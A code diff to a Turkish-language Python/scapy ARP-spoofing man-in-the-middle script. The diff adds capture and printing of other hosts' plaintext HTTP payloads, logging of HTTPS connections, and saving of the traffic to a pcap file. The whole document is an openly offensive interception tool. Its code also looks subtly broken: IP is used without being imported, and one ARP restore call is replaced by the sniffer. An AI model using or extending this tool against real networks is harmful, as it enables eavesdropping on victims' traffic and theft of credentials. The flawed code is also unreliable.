@@ -1,4 +1,4 @@
-from scapy.all import ARP, Ether, send, srp
+from scapy.all import ARP, Ether, send, srp, sniff, wrpcap, Raw, TCP
 import time
 import sys
 
@@ -24,11 +24,27 @@ def restore(target_ip, gateway_ip, interface):
     send(arp_response, iface=interface, verbose=False)
     print("[+] ARP Tabloları Düzeltildi")
 
+def packet_callback(packet):
+    if packet.haslayer(TCP):
+        if packet.haslayer(Raw):
+            payload = packet[Raw].load.decode(errors="ignore")
+            if "HTTP" in payload:
+                print(f"\n[HTTP Paketi] {packet[IP].src} -> {packet[IP].dst}")
+                print(payload)
+        elif packet[TCP].dport == 443 or packet[TCP].sport == 443:
+            print(f"[HTTPS Paketi] {packet[IP].src} -> {packet[IP].dst}")
+
+def sniff_packets(interface, packet_count):
+    print(f"[*] HTTP ve HTTPS trafiği dinleniyor... ({packet_count} paket yakalanacak)")
+    packets = sniff(iface=interface, count=packet_count, prn=packet_callback, filter="tcp")
+    wrpcap("captured_traffic.pcap", packets)
+    print("[+] Paketler 'captured_traffic.pcap' dosyasına kaydedildi.")
+
 def main():
-    # Kullanıcıdan bilgileri alalım
     target_ip = input("[?] Hedef IP adresini girin: ")
     gateway_ip = input("[?] Ağ geçidi (gateway) IP adresini girin: ")
     interface = input("[?] Ağ arayüzünü girin (örneğin, eth0 veya wlan0): ")
+    packet_count = int(input("[?] Kaç paket yakalamak istiyorsunuz: "))
 
     try:
         print("[*] MITM Saldırısı Başlıyor... (CTRL+C ile durdurabilirsiniz)")
@@ -39,7 +55,7 @@ def main():
     except KeyboardInterrupt:
         print("\n[-] Saldırı Durduruluyor...")
         restore(target_ip, gateway_ip, interface)
-        restore(gateway_ip, target_ip, interface)
+        sniff_packets(interface, packet_count)
         sys.exit(0)
 
 if __name__ == "__main__":
